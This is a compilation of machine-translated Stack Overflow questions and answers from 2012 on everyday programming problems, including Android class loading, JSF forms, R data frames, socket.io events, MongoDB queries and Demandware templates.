# android - 是否可以在不使用 JNI 的情况下在 Android 应用程序开发中实现 DLL 概念？

> ID：13599050
> 
> 赞同：3
> 
> 时间：2012-11-28T06:23:38.073
> 
> 标签：android, dll, jar, java-native-interface

我有一个使用 .jar 文件执行的 android 应用程序。jar 文件在构建时添加到项目中。所以最终的输出只是一个apk。这很好。但是我发现即使 jar 文件只发生了变化，我也很难继续构建项目。如何在不使用 JNI 的情况下将 jar 从项目中分离出来并使其仅在运行时可访问（就像 DLL 一样）？这样就不需要在每次 jar 更改时都构建应用程序。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T09:27:59.640

这看起来像是要走的路。DexClassLoader：

[http://developer.android.com/reference/dalvik/system/DexClassLoader.html](http://developer.android.com/reference/dalvik/system/DexClassLoader.html)

它“只是”一个 ClassLoader，包含该区域附带的所有内容。

PS。（前方不请自来的建议！）这可能不是您真正需要的。我会考虑为什么您的项目目前的构建方式不方便并首先对其进行优化。

# java - 如何使用 JavaScript 获取输入表单值以及整个页面 HTML 源以将其传递给支持 bean？

> ID：13599056
> 
> 赞同：1
> 
> 时间：2012-11-28T06:23:55.403
> 
> 标签：java, javascript, html, jsf-2, facelets

在我的 Facelets 页面中，我有一个`<div>`并且包含一些输入文本框，供用户输入要提交的值。我将使用这个 HTML 源代码生成 PDF。

```
<div id="wrapper">
    <h:form prependId="false">
        <h:inputHidden id="source" value="#{bean.source}" />
        <h:inputText id="fName" value="#{bean.firstName}"/>
        <h:inputText id="lName" value="#{bean.lastName}"/>
        <h:inputText id="age" value="#{bean.age}"/>
    </h:form>
</div> 
```

像这样我也有其他表单域。当用户在表单中输入所有数据并单击提交按钮时，我正在`<div>`使用 JavaScript 获取其中的源代码。

```
function getHtml() {
    document.getElementById('source').value = document.getElementById('wrapper').innerHTML;
} 
```

并在点击提交时传递给 bean。

```
<h:commandButton type="submit" id="appl-submit" action="#{bean.submit}"
                 value="Submit" onclick="javascript:getHtml();"/> 
```

在支持 bean 类中

```
@ManagedBean
@SessionScoped
public class Bean{

    private String firstName;
    private String lastName;
    private int age;
    private String source;

    // Getters and setters for all properties.
} 
```

但我只得到带有空输入字段的表单，而不是 HTML 源以及用户输入的值。如何获取 HTML 源代码和表单值？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T13:51:44.597

> *但我只得到带有空输入字段的表单，而不是 HTML 源以及用户输入的值。*

这是预期的行为。这种方法仅在您已经提交表单并因此重新显示提交的表单（作为确认）时才有效。

* * *

> *如何获取 HTML 源代码和表单值？*

这已经在您之前从未给出反馈的问题中得到了回答：[获取当前 XHTML 页面的 URL，该页面将用户数据填写到 JSF Managed bean](https://stackoverflow.com/questions/12904974)中。在您的特定情况下，这甚至可以更简单地完成，因为您显然已经有了一个会话范围的 bean（但是这仍然是糟糕的设计，因为同一会话中多个浏览器窗口/选项卡中的同一页面可能会相互干扰）：

```
public void submit() throws IOException {
    ExternalContext externalContext = FacesContext.getCurrentInstance().getExternalContext();
    HttpServletRequest request = (HttpServletRequest) externalContext.getRequest();
    HttpSession session = (HttpSession) externalContext.getSession(true);
    String url = request.getRequestURL().append(";jsessionid=").append(session.getId()).toString();

    Document doc = Jsoup.connect(url).get();
    String html = doc.select("#wrapper").html();
    // ...
} 
```

# r - 指向 attach() 中新创建的变量的指针

> ID：13599061
> 
> 赞同：1
> 
> 时间：2012-11-28T06:24:11.247
> 
> 标签：r

我知道“指针”不是正确的术语，但我希望它足够接近。我有以下代码：

```
> attach(iris)
> iris$x <-0
> x
Error: object 'x' not found 
```

似乎在 attach() 之后，R 为每个变量创建了一个对象。但是在我通过直接访问数据集创建新变量后，没有为该变量创建新对象。

如果我希望 R 也为它创建一个新对象，我应该如何为 iris 创建一个新变量？

更新：我知道很多 R 的老手建议不要使用 attach()。但是我需要进行大量的数据操作（数百个新变量），并且按顺序对每个人调用 transform(df,) 会非常麻烦。是否可以在 R 中执行类似于 SAS 数据步的操作，在一个数据步中，您可以创建一个变量并在之后立即引用它：

```
 data A;
 set A;
 varA = varB > 1;
 varC = var A + varB;
 ....
 run; 
```

更新 2：我能想到的一种方法是使用`attach()`，然后创建数百个数组，然后再创建`cbind`它们，`detach()` 谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-28T07:38:44.447

`attach()`没有做任何此类事情；它刚刚在搜索路径上放置了对象的副本，这允许 R 在查找名称时查看对象内部。

上面的关键词是“复制”。这解释了你看到的行为；搜索路径上的副本`iris`不是全局工作区中的副本，您正在修改后者而不是前者。

简单的答案是不要使用`attach()`. 要向对象添加变量，请查看`transform()`和`within()`。

```
iris <- transform(iris, x = rep(0, nrow(iris))) 
```

或者

```
iris <- within(iris, x <- rep(0, nrow(iris))) 
```

要直接在对象中使用组件，您可以使用`with()`，例如

```
with(iris, length(x)) 
```

我建议您阅读相关帮助文件以获取使用示例等。

# django - 使用只能使用一次的链接向用户发送邮件

> ID：13599064
> 
> 赞同：0
> 
> 时间：2012-11-28T06:24:30.840
> 
> 标签：django, web

这是我的第一个 Web 开发项目，我正在使用 Django 构建项目预订系统。

要求：如果用户预订了一个项目并使用它超过一个星期，将发送一封电子邮件给他，以重新确认项目的使用情况。

每封电子邮件都有一个链接，显示用户使用超过一周的所有项目，项目将根据用户决定被释放或继续使用。

这是场景，用户打开电子邮件中提供的链接两次（可能更多），正如我所说的，每个打开的链接都会有他正在使用的项目列表。在“第一个”链接中，用户取消选中一个项目并提交它，然后，他将转到“第二个”链接（显然包含错误数据）并尝试取消选中某个项目并提交它。当用户在“第二个”链接中提交时，我想抛出一个错误，说你已经执行了这个操作。

我的解决方案是使用表中的字段（数据库中的用户表）说“link_used”，当用户使用“第一个”链接时我将存储“是”，当他使用第二个链接时，代码将检查“link_used”列并发出错误信息。

此“link_used”列将在发送下一封邮件时重置。

我的解决方案正确吗？

谷歌搜索并没有找到与我的场景相关的解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:37:38.193

通过这样做，您将失去历史记录并询问运行条件。

为链接/电子邮件创建单独的模型，类似于下面的示例。

```
class OneTimeCode(models.Model):

    user = models.ForeignKey('auth.User')
    code = models.CharField(…)
    date_sent = models.DateTimeField(auto_now_add=True, …)
    date_used = models.DateTimeField(null=True, …)

    @property
    def link_used(self):
        return self.date_used is not None 
```

这样您就可以保留所有代码及其用法的历史记录。

# c# - C# 使用文本框输入更改表单宽度/高度？

> ID：13599067
> 
> 赞同：-2
> 
> 时间：2012-11-28T06:24:43.430
> 
> 标签：c#, winforms, textbox

有什么方法可以反转此代码，以便用户可以通过文本框条目设置窗口窗体的宽度/高度？

```
textBox1.Text = this.Width.ToString(); 
```

我正在用 C# 编码

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T06:57:38.063

您可以通过设置表单的边界来尝试

`this.Bounds = new Rectangle(0,0,Width,Height);`

传入从 中捕获的`Width`and这应该可以帮助您设置表单高度宽度。`Height``TextBox`

# onclick - Blackberry10 级联 Labelfield 点击

> ID：13599070
> 
> 赞同：1
> 
> 时间：2012-11-28T06:24:53.820
> 
> 标签：onclick, label, blackberry-10

如何添加点击标签字段以将一个 qml 文件推送到另一个 qml 文件，这里是代码

```
 Label {
             text: "Don't have an account?"
             horizontalAlignment: HorizontalAlignment.Center
             textStyle.fontSizeValue: 6.0
             } 
```

并且还想放置后退按钮并弹出屏幕，任何人都可以发送一些示例代码来解决这个问题吗？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T13:06:43.183

您可以使用 onTouch 信号：

```
onTouch: {
            if (event.isUp()) {
               //undisplay focus
               buttonClicked();
            }
            if (event.isDown() || event.isMove()) {
                //display focus
            } else {
                //undisplay focus
            }
        } 
```

# node.js - 为什么我的 socket.emit 事件多次触发（基于全局连接数）到同一个客户端？

> ID：13599071
> 
> 赞同：2
> 
> 时间：2012-11-28T06:24:55.800
> 
> 标签：node.js, socket.io

下面是我处理动态分配的命名空间的代码。客户端连接，然后，使用它的引用者，查找客户端的帐户 ID，并且在下面不存在的函数中，如果该帐户 ID 尚未分配给它的命名空间，则生成一个新的命名空间 (UUID) 或返回现有的命名空间。

然后，该名称空间被发送到客户端，客户端依次响应`connect`该特定名称空间上的新消息。

这一切都有效。

不幸的是，`ns_socket.emit('hi');`无论有多少客户端连接，该语句都会被触发回 ns_socket。

需要明确的是，如果客户端 1 连接到命名空间，`hi`则会向该客户端触发一次。当客户端 2 连接到同一个命名空间时，`hi`由于未知的（对我而言）原因，它会向第二个客户端触发两次，而它应该只触发一次。

显然，任何帮助将不胜感激。

```
var main = io.of('').on('connection', function(socket) {
    socket.on('joinDynNs',function(data) {
        var nameslug = socket.handshake.headers.referer.match(/(http(s)?:\/\/)([A-Za-z0-9-]+)\./)[3];
        getActID(nameslug, function(actID) {
            var ns = getNamespace(nS, actID);
            socket.emit('assignNamespace',{ns:ns});
            io.of('/' + ns).on('connection', function(ns_socket) {
                ns_socket.emit('hi');
            });
        });
    });
}); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-28T08:17:14.823

您的逻辑是这样编写的，即每当套接字连接到基本命名空间时，都会创建命名空间的连接处理程序。因此，每次新客户端连接到基本命名空间时，您都会设置*另一个*连接处理程序。换句话说，你在打电话

```
io.of('/' + ns).on('connection', function(ns_socket) {
    ns_socket.emit('hi');
}); 
```

每次有新连接进入时。连接处理程序并不特定于您正在处理的套接字；它会为命名空间上的任何新连接触发。这就是您看到消息计数不断增加的原因。

我不确定您的全部需求，但我认为[房间](https://github.com/LearnBoost/socket.io/wiki/Rooms)对您来说是一个更好的解决方案；命名空间实际上是为多路连接而设计的（例如，多个完全不相关的应用程序在同一个 Socket.IO 端口上运行）；rooms 允许您将套接字分组为逻辑组，并向该组中的套接字发送消息。

# c# - MongoDB 根据记录中集合的内容查找

> ID：13599073
> 
> 赞同：0
> 
> 时间：2012-11-28T06:25:32.290
> 
> 标签：c#, mongodb

我有一个存储在 MongoDB 中的用户集合

给定发票号，我将如何查询 User 集合以获取关联的用户？（在 Payments 包含 InvoiceNumber = '###' 的记录的集合中查找用户）

```
public class User
{
[BsonId]
public ObjectId ID { get; set; }
public string UserName {get;set;}
public List<PaymentInfo> Payments {get;set;} 
}

public class PaymentInfo
{
public string CardNumber {get;set;}
public int InvoiceNumber {get;set;}
public float Amount {get;set;}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T13:30:55.427

数组对 MongoDB 是透明的。所以

```
db.yourCollection.find({Payments.InvoiceNumber: 1234}) 
```

应该返回支付数组包含一个或多个 InvoiceNumner = 1234 对象的所有文档。

# sql - SQL 用数据填表

> ID：13599075
> 
> 赞同：0
> 
> 时间：2012-11-28T06:25:36.987
> 
> 标签：sql, matrix-multiplication

我正在做一个涉及矩阵的矩阵乘法项目
所以这是我的表格格式：

```
 create table A ( row integer, col integer, val integer); 
```

我需要做的是用数据填充每个表，
任务 1：创建一个 200*200 矩阵 A 并将其所有元素初始化为 1。
这意味着我会手动
插入 <0,0,1> <0, 1,1> <0,2,1> ....<0,199,1>
插入<1,0,1> <1,1,1> <0,2,1> .....<1,199, 1>等等

任务 2：创建 200*200 矩阵 A，其对角元素为 1。

所以我想知道而不是手动执行此操作，是否有自动初始化所​​有元素？
以下是使用 while 循环的尝试：

```
create table A ( row integer, col integer, val integer);
DECLARE @count INT
SET @count = 0
DECLARE @count2 INT
SET @count2 = 0
WHILE (@count < 200)
BEGIN
   WHILE (@count2 <200)
   BEGIN
      INSERT INTO A([row], [col]) VALUES (@count, @counts)
      SET @count2 = (@count2 + 1)
   END
   SET @count = (@count + 1)
END 
```

上面这个对吗？我对sql相当陌生:(

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T06:43:11.327

避免循环和迭代的东西。您在 SQL Server 中 - 认为基于集合

尝试这个

```
insert into A( row, col, val )
select row, col, 1
from 
(
        SELECT Row = number from master..spt_values 
        where type='P' and number between 1 and 200
) Rows
CROSS JOIN
(
        SELECT Col = number from master..spt_values 
        where type='P' and number between 1 and 200
) Cols 
```

对于您的第二个要求，您可以偷懒并添加

```
where Row = Col 
```

如果是一次性的，那应该没问题。

该`master..spt_values`位是关于获取 1 到 200 之间的数字范围。您也可以有以下变化：

```
; WITH cte AS
  (
    SELECT n = number  FROM master..spt_values 
    WHERE type = 'P'  AND  number BETWEEN 1 AND 20
  ) 
INSERT INTO A ( row, col, val )
SELECT Rows.n, Cols.n, 1
FROM
    cte AS Rows
  CROSS JOIN
    cte AS Cols ; 
```

# iphone - 恢复文本字段数据

> ID：13599078
> 
> 赞同：1
> 
> 时间：2012-11-28T06:25:46.317
> 
> 标签：iphone, objective-c, ios5

我的视图中有几个文本字段，我在其中接受用户的输入。该视图包含必填和可选字段。我已经对必填字段进行了验证。每当我检查每个必填字段的验证。如果必填字段的验证失败，则会弹出 UIAlertView。每次 AlertView 弹出剩余文本文件中的所有信息时都会被清除。如何确保文本字段上的数据不会被擦除。

**我正在使用的警报视图**

```
UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Validation"
                                                        message:@"Please enter name."
                                                       delegate:nil
                                              cancelButtonTitle:@"OK"
                                              otherButtonTitles:nil];
        [alert show];
        [alert release]; 
```

**编辑 1** 我试过 `delegate:self`了，但还是一样

**编辑 2**

```
if(userName.text.length>0 )
{
// Process further
}
else{
 UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Validation"
                                                            message:@"Please enter name."
                                                           delegate:nil
                                                  cancelButtonTitle:@"OK"
                                                  otherButtonTitles:nil];
            [alert show];
            [alert release]; 
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:16:58.323

`UITextFieldDelegate`在您的文件中设置`.h`并声明`UITextField *txtfldFirstName;`

```
 txtfldFirstName=[[UITextField alloc]initWithFrame:CGRectMake(110, 110, 160, 25)];
    txtfldFirstName.backgroundColor=[UIColor clearColor];
    txtfldFirstName.text=@"";
    txtfldFirstName.autocapitalizationType=NO;
    txtfldFirstName.borderStyle=UITextBorderStyleLine;
    txtfldFirstName.delegate=self;
    [self.view addSubview:txtfldFirstName]; 
```

在您执行的操作中

```
if ([txtfldFirstName.text isEqualToString:@""]) {
UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Validation"
                                                            message:@"Please enter name."
                                                           delegate:nil
                                                  cancelButtonTitle:@"OK"
                                                  otherButtonTitles:nil];
            [alert show];

}
else
{
// your operation if textfield not empty
} 
```

否则使用

```
-(void)textFieldDidEndEditing:(UITextField *)textField
{

 if (textField==txtfldFirstName) {
    UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Validation"
                                                                message:@"Please enter name."
                                                               delegate:nil
                                                      cancelButtonTitle:@"OK"
                                                      otherButtonTitles:nil];
                [alert show];

    }

} 
```

# java - JButton 以编程方式显示工具提示：actionMap.get("postTip") 为 null

> ID：13599079
> 
> 赞同：1
> 
> 时间：2012-11-28T06:25:48.763
> 
> 标签：java, swing, tooltip, jbutton, focuslistener

当我的 button2 获得焦点时，我需要以编程方式显示它的工具提示。（我按 Tab 作为最初的焦点在按钮 1）

```
 JButton button = new JButton("Button 1");

            JButton button2 = new JButton("Button 2");
            button2.setToolTipText("tooltip2");
            button2.addFocusListener(new FocusListener()); 
```

我参考@camickr的[代码](https://stackoverflow.com/questions/6473464/forcing-a-java-tooltip-to-appear)

```
private class FocusListener extends FocusAdapter {
 public void focusGained(FocusEvent e)
 {
    JComponent component = (JComponent)e.getSource();
    Action toolTipAction = component.getActionMap().get("postTip"); 
```

但 toolTipAction 设置为空。

我已经使用此代码打印了 ActionMap 的所有条目

```
 ActionMap actionMap = component.getActionMap();
        Object[] actionMapKeys = actionMap.allKeys();

        for (int i = 0; i < actionMapKeys.length; i++) {
            Object key = actionMapKeys[i];
            System.out.println(key.toString() + " : " + actionMap.get(key).toString());
        } 
```

这就是它给我的

```
pressed : javax.swing.plaf.basic.BasicButtonListener$Actions@49cf9f
released : javax.swing.plaf.basic.BasicButtonListener$Actions@1de0b5e 
```

**那么如果我的 toolTipAction 为空，我该如何调用这段代码呢？**

```
ActionEvent postTip = new ActionEvent(component, ActionEvent.ACTION_PERFORMED, "");
toolTipAction.actionPerformed(postTip); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T06:40:11.910

您还可以尝试配置工具提示管理器以在输入鼠标时立即显示工具提示的替代方法。

```
javax.swing.ToolTipManager.sharedInstance().setInitialDelay(0) 
```

如果您希望仅对某些组件发生这种情况，则可以根据获得焦点的组件更改此值。

`Ctrl+F1`按下时也会显示工具提示。`java.awt.Robot`因此，当您想显示工具提示时，您可以在按钮上使用 Ctrl+F1 来模拟。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-28T06:53:53.583

> 实际上我想在一些网络事件上显示工具提示，这与鼠标无关。但我已经开始通过 Tab 键获得焦点的实验

*   使用`JWindow`（未装饰`JDialog`）或`JLabel`代替， [@Guillaume Polet](https://stackoverflow.com/questions/10715612/how-to-display-a-text-above-a-jtable-cell-when-editing/10716342#10716342)和[此处](https://stackoverflow.com/a/5957405/714968)`ToolTip`的示例`JLabel`

*   您可以将此容器放置到`Mouse Cursor`位置或坚持绝对坐标，`Point`到可见的 GUI

*   标准可能（可能很烦人）见[SystemTray 和 TrayIcon#displayMessage](https://stackoverflow.com/a/12707482/714968)

# javascript - jquery可拖动功能

> ID：13599082
> 
> 赞同：1
> 
> 时间：2012-11-28T06:26:08.017
> 
> 标签：javascript, jquery-ui, jquery, jquery-plugins

我只想在 4-5 秒后调用 OVER 功能块， **我按住拖动的项目几秒钟，然后需要调用 OVER 功能块，否则不**

```
$('.treeLink').droppable({
    tolerance: 'pointer',
    accept: '.childLinks',
    over: function() {},
    over: function() {
        getTreeLinks($(this).attr('id').split("treeLink")[1]);
    },
    drop: function() {
        updateGovLinks($(this).attr('id'));
    }
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T06:37:18.300

您可能想要使用某种超时：

```
var timeout;
$('.treeLink').droppable({
    tolerance: 'pointer',
    accept: '.childLinks',
    over: function() {
        var self = this;
        timeout = setTimeout(function () {
             getTreeLinks($(self).attr('id').split("treeLink")[1])
        }, 4000);
    },
    out: function () {
        clearTimeout(timeout);
    },
    drop: function() {
        updateGovLinks($(this).attr('id'));
    }
}); 
```

# mongodb - MongoDB：最小属性匹配

> ID：13599084
> 
> 赞同：0
> 
> 时间：2012-11-28T06:26:24.340
> 
> 标签：mongodb

我有一个像这样的两个二进制字符串 10110 和 01111 的 MongoDB 集合

```
 { element_id:a, field_1:1, field_2:0, field_3:1, field_4:1, field_5:0} #binary string: 10110
 { element_id:b, field_1:0, field_2:1, field_3:1, field_4:1, field_5:1} #binary string: 01111 
```

我想在 MongoDB 中查询候选二进制字符串“11111” **，但我的最小匹配（AND）值为 4**（不是全部为 5）。这意味着只需要四个匹配一个位置即可从数据库中选择该文档。

所以预期的输出将是 - element_id:b

我在 MongoDB 网站或 Google 上找不到任何东西。任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T13:13:02.397

根据 Chien-Wei 早期的回答，[MapReduce是一种很好的方法。](http://www.mongodb.org/display/DOCS/MapReduce)在 MongoDB 2.2 中，您还可以考虑使用[聚合框架](http://docs.mongodb.org/manual/applications/aggregation/)。

例如，如果您总是匹配 11111，那么您可以匹配[`$add`](http://docs.mongodb.org/manual/reference/aggregation/#_S_add)感兴趣字段的值，然后只匹配`$match`至少有 4 个字段的值：

```
db.element.aggregate(
    // Could use an initial $match here to find candidate documents (using indexed query)

    // Use $project to add calculated total
    { $project: {
        _id: 0,
        element_id: 1,
        // Assume we are matching 11111 and field values are always 0 or 1
        total: { $add: [ "$field_1", "$field_2", "$field_3", "$field_4", "$field_5" ] }
    }},

    // Filter to interesting results (at least 4 fields with '1')
    { $match: {
        total : { $gte : 4 }
    }}
) 
```

样本输出：

```
{ "result" : [ { "element_id" : "b", "total" : 4 } ], "ok" : 1 } 
```

如果您想要更通用的比较，您可以使用[`$cond`](http://docs.mongodb.org/manual/reference/aggregation/#_S_cond)条件匹配目标数组，例如：

```
var targetArray = [1,1,1,1,1];
db.element.aggregate(
    // Could use an initial $match here to find candidate documents (using indexed query)

    // Use $project to add calculated total
    { $project: {
        _id: 0,
        element_id: 1,
        total: { $add: [
            { $cond:[{$eq:["$field_1", targetArray[0]]}, 1, 0 ]},
            { $cond:[{$eq:["$field_2", targetArray[1]]}, 1, 0 ]},
            { $cond:[{$eq:["$field_3", targetArray[2]]}, 1, 0 ]},
            { $cond:[{$eq:["$field_4", targetArray[3]]}, 1, 0 ]},
            { $cond:[{$eq:["$field_5", targetArray[4]]}, 1, 0 ]}
        ]}
    }},

    // Filter to interesting results (at least 4 fields with a match)
    { $match: {
        total : { $gte : 4 }
    }}
) 
```

有关聚合选项和当前限制的一般比较，请参阅相关的 StackOverflow 问题：[MongoDB 聚合比较：group()、$group 和 MapReduce](https://stackoverflow.com/questions/12337319)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T09:49:00.673

这是我的方法，虽然有点丑...

我使用map/reduce：（`f`是你的输入，你必须在函数中设置数组）

```
m = function() { 
    c=0; 
    f = [1,1,1,1,1]; 
    if(f[0]==this.field_1){c++;} 
    if(f[1]==this.field_2){c++;} 
    if(f[2]==this.field_3){c++;} 
    if(f[3]==this.field_4){c++;} 
    if(f[4]==this.field_5){c++;} 
    if(c>=4){
        emit(this.element_id, c)
    }
};

r = function(key, values) { return {key:values}; };

db.test.mapReduce(m, r, {out:{inline:1}})['results'] 
```

结果：

```
[ { "_id" : "b", "value" : 4 } ] 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-28T13:33:31.297

您可以使用修饰符以编程方式构建复杂查询，`$or`以匹配请求元素的所有可能组合：

```
buildQuery = function(arr){
  var N, i, j, query, subquery;
  N = arr.length;
  query = {$or: []};
  for (i = 1; i <= N; ++i) {
    subquery = {};
    for (j = 1; j <= N; ++j) {
      if (i === j) continue;
      subquery['field_' + j] = arr[j-1];
    }
    query.$or.push(subquery);
  }
  return query;
}

query = buildQuery([1,1,1,1,1]);
db.collection.find(query) 
```

`buildQuery`输出将如下所示：

```
{ '$or': 
   [ { field_2: 1, field_3: 1, field_4: 1, field_5: 1 },
     { field_1: 1, field_3: 1, field_4: 1, field_5: 1 },
     { field_1: 1, field_2: 1, field_4: 1, field_5: 1 },
     { field_1: 1, field_2: 1, field_3: 1, field_5: 1 },
     { field_1: 1, field_2: 1, field_3: 1, field_4: 1 } ] } 
```

# ios - 在 ios 中确定和调整相机缩放级别

> ID：13599086
> 
> 赞同：0
> 
> 时间：2012-11-28T06:26:36.470
> 
> 标签：ios

我想确定 ios 中的相机缩放级别。我如何根据我的视力调整缩放级别，如 20/20、20/50 等。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T06:38:03.077

我不确定，但您是否尝试添加以下代码以便默认缩放控件可见？

```
picker.showsCameraControls = YES; 
```

# jquery - 在 wordpress 灯箱上滑动以获取图像

> ID：13599087
> 
> 赞同：0
> 
> 时间：2012-11-28T06:26:42.070
> 
> 标签：jquery, wordpress, ipad, lightbox

我一直无法弄清楚如何做到这一点。

我目前正在使用这个名为 jQuery Lightbox 的插件。在 Ipad 上，我需要能够滑动

通过图像而不是单击上一个，下一个按钮

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-06T07:49:23.880

我认为其中有很多，但这里有一个支持滑动图像的灯箱 jQuery 插件： [TouchTouch](http://tutorialzine.com/2012/04/mobile-touch-gallery/)

# node.js - 构建节点源时出错

> ID：13599088
> 
> 赞同：1
> 
> 时间：2012-11-28T06:26:42.087
> 
> 标签：node.js

我正在尝试构建节点源

```
vcbuild.bat release 
```

当我执行上述命令时，

```
error MSB6006: "cmd.exe" exited with code 1 
```

抛出错误。

完整的错误信息是

```
C:\Program Files (x86)\MSBuild\Microsoft.Cpp\v4.0\Microsoft.CppCommon.targets(151,5): error MSB6006: "cmd.exe" exited with code 1\. [D:\nodesource\node-master\node_perfctr.vcxproj] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-29T10:05:57.317

错误的原因是错误地生成了 node_js2c.vcxproj，其中 Python 的路径包含空格并且没有被引用。修复 - 编辑文件，并在 Python 路径周围添加引号

调用调用**“* *C:\Program Files\python27\python.exe*** *”* * ...

# regex - boost/regex/v4/regex_workaround.hpp:199:37：错误：未在此范围内声明“sizeInBytes”

> ID：13599089
> 
> 赞同：1
> 
> 时间：2012-11-28T06:26:50.977
> 
> 标签：regex, boost

当我使用 boost regex 编译程序时，出现如下编译错误：

```
在 /usr/local/include/boost/regex/v4/regex.hpp:32:0 包含的文件中，
             来自 /usr/local/include/boost/regex.hpp:31，
             来自 ProcessAffinityManager.cpp:38：
/usr/local/include/boost/regex/v4/regex_workaround.hpp：在函数“size_t boost::re_detail::strcpy(char*, const char*)”中：
/usr/local/include/boost/regex/v4/regex_workaround.hpp:199:37：错误：未在此范围内声明“sizeInBytes”

```

但是当我检查源文件时`regex_workaround.hpp`，`sizeInBytes`是一个参数，错误不应该在这里。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-02-05T11:33:24.043

I agree with the commentator that more info is required..

However I had the exact same issue in a project I am working on using minGW 4.8.1 After a little investigation I found that someone added a macro hack to our project of the sort:

```
#define strcpy_s(A,B,C) strcpy(A,C) 
```

The idea I guess was to solve a compatibility issue with between VS and MinGW. VS defines "secure" versions of many C string functions such as strcpy_s(A,B,C). A lot of libraries when compiling on windows use these versions of the functions, however they are missing for older versions of VS and for MinGW

Boost::regex solves this issue by trying to define a strcpy_s for environments that might miss it. It clashes with the ugly hack of trying to force strcpy_s calls to use strcpy

If your problem is like mine the solution is to find who added the strcpy_s hack and move to a solution of providing such a function

# delphi - 面板的锚属性未按预期工作

> ID：13599091
> 
> 赞同：0
> 
> 时间：2012-11-28T06:27:03.993
> 
> 标签：delphi, delphi-xe2, panel

我有一个尺寸为 (600 * 400) 的德尔福形式，即宽度 = 600 和高度 = 400。我在其上保留了 3 个尺寸相同的面板，尺寸 (150 * 300) 彼此等距。

现在，我需要在调整表单大小（手动或通过最大化按钮变小或变大）时，面板应随表单调整大小。

我为此使用了 anchors 属性。但它没有按预期工作。面板彼此重叠。我很困惑将哪个锚属性设置为 true 或将哪个锚属性设置为 false 来完成此功能。请帮我解决这个问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T06:56:52.480

我倾向于以另一种方式（无论是对还是错）攻击这种方式，您可以使用“对齐”属性将面板“对齐”到表单的一侧或另一侧。然后，我经常选择一个与“客户端”对齐的主面板，以在调整大小时占据大部分可用空间（因此，一个面板与左侧对齐，另一个与顶部对齐，第三个与客户端对齐。您可以在面板中拥有面板，并且使用拆分器组件允许用户根据需要调整大小。这可能不是你想要的结果，但肯定会避免重叠问题，这只是我猜想的地方。

但是，也许您希望事物可以缩放，因此每个面板都保持相同的纵横比？鉴于您标记了 XE2，如果这是 FireMonkey 表单，那么我认为缩放表单将是一种选择（请参见此处：[http](http://edn.embarcadero.com/article/42560) ://edn.embarcadero.com/article/42560 ）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-28T06:58:42.663

您必须手动定位和调整它们的大小。您可以使用面板所有者的 OnReSize-Method。

```
procedure TOwnerForm.OnResize(Sender : TObject);
begin
  panel1.width := Self.Width div 3;
  panel2.width := Self.width - 2*panel1.Width;
  panel3.width := Self.Width - panel1.Width - panel2.Width;
  panel1.Left := 0;
  panel2.Left := panel1.left + panel1.width;
  panel3.left := panel2.left + panel2.width;
  panel1.top := 0;
  panel2.top := panel1.top;
  panel3.top := panel1.top;
end; 
```

# whitespace - 如何在 Demandware 中删除 HTML 源代码中的空格？

> ID：13599099
> 
> 赞同：11
> 
> 时间：2012-11-28T06:27:35.877
> 
> 标签：whitespace, demandware

我正在开发需求软件平台。我在源代码（HTML）中有太多空格。我不知道如何优化它，请帮助我。

提前致谢

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-05T21:32:34.077

我们对最终结果的控制有限，但是有*iscontent*标签，它有一个*compact*属性。

```
<iscontent type="text/html" compact="true" /> 
```

请注意，此标签不会过滤到包含的模板。每个包含的模板都需要自己的*iscontent*标签来压缩空格。Demandware 声明 compact 可能会破坏标签的布局`<pre>`，因此请谨慎使用。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-10T05:14:07.630

取决于您所说的“优化”是什么意思。如果您只是想减少下载大小，那么最好在 Web 服务器上启用 Gzip 压缩，因为它会将空格所需的数据压缩到几乎为零，并且还会压缩其余的标记。如果您有其他原因，请详细说明。例如，如果您希望源代码“干净”以用于调试/开发目的，那么您可以在客户端使用源代码清理器（即，Firefox 插件或 HTMLTidy 接口）来实现相同的结果。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2020-11-06T17:26:06.233

源代码中的本地包含似乎存在问题，留下多个空白行。Modules.isml 可能特别令人反感。将 compact 设置为 'true' 无济于事。

我最近将@sholsinger 的答案与使用 grunt 而不是 gulp 的 Demandware/SFCC Build Suite 结合起来来解决这个问题。

基本看起来像这样：

将 grunt-contrib-htmlmin 添加到 task_loader.js 和 package.json 并运行 npm install。

在 grunt/config 中添加了 htmlmin.js。

```
module.exports = {
minify: {
    options: {
        removeComments: true,
        collapseWhitespace: true
    },
    files: {
        '<%= dw_properties.folders.code %>app_core/cartridge/templates/default/util/modules.isml': '<%= dw_properties.folders.code %>app_core/cartridge/templates/default/util/modules.isml',  
    }
}
} 
```

然后将其添加到 alises.yaml: 'htmlmin:minify'

* * *

## 回答 #4

> 赞同：0
> 
